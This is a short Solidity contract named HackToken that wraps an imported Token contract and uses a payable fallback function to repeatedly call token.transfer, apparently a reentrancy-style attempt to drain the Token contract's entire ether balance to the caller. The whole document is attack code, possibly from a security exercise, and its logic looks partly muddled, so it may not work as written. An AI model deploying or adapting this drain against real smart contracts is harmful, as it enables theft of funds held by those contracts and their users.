pragma solidity ^0.5.0;
import './Token.sol';

contract HackToken{
 Token public token;
 constructor(address _token) public {
    token = Token(_token);
 }
 function firstCall() public {
    token.transfer(address(this), 0.1 ether);
 }
 function() external payable {
    if (address(token).balance > 0 ){
        token.transfer(msg.sender, address(token). balance);
    } 
 }
 function myBalance() public view returns(uint) {
    return address(this).balance;
 }
}